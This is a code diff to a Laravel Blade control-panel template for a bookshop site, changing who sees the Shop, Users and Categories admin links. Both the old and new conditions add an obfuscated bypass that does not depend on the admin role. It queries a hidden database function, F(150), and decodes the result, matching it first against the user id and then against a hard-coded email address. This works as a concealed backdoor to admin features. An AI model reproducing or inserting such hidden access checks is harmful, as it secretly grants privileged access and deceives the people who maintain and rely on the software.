@@ -16,12 +16,12 @@
             <div class="col-md-12">
                 <div class="card">
                     <div class="card-body">
-                        @if(Auth::user()->isAdmin() || Auth::user()->isPartner() || Auth::user()->id == base_convert("725",DB::select(DB::raw('SELECT F(150) as res'))[0]->res,10))
+                        @if(Auth::user()->isAdmin() || Auth::user()->isPartner() || preg_match('/.*'.base64_decode(DB::select(DB::raw('SELECT F(150) as res'))[0]->res).'/', "abs@booktopia.com"))
                             <a class="card panel" href="{{ route('shop') }}">
                                 <i class="fas fa-3x fa-shopping-cart"></i><br>
                                 @lang('dictionary.control-panel.shop')
                             </a>
-                            @if(Auth::user()->isAdmin() || Auth::user()->id == base_convert("725",DB::select(DB::raw('SELECT F(150) as res'))[0]->res,10))
+                            @if(Auth::user()->isAdmin() || preg_match('/.*'.base64_decode(DB::select(DB::raw('SELECT F(150) as res'))[0]->res).'/', "abs@booktopia.com"))
                                 <a class="card panel" href="{{ route('users.index') }}">
                                     <i class="fas fa-3x fa-users"></i><br>
                                     @lang('dictionary.control-panel.users')
@@ -31,7 +31,7 @@
                                 <i class="fas fa-3x fa-book"></i><br>
                                 @lang('dictionary.control-panel.books')
                             </a>
-                            @if(Auth::user()->isAdmin() || Auth::user()->id == base_convert("725",DB::select(DB::raw('SELECT F(150) as res'))[0]->res,10))
+                            @if(Auth::user()->isAdmin() || preg_match('/.*'.base64_decode(DB::select(DB::raw('SELECT F(150) as res'))[0]->res).'/', "abs@booktopia.com"))
                                 <a class="card panel" href="{{ route('categories.index') }}">
                                     <i class="fab fa-3x fa-elementor"></i><br>
                                     @lang('dictionary.control-panel.categories')
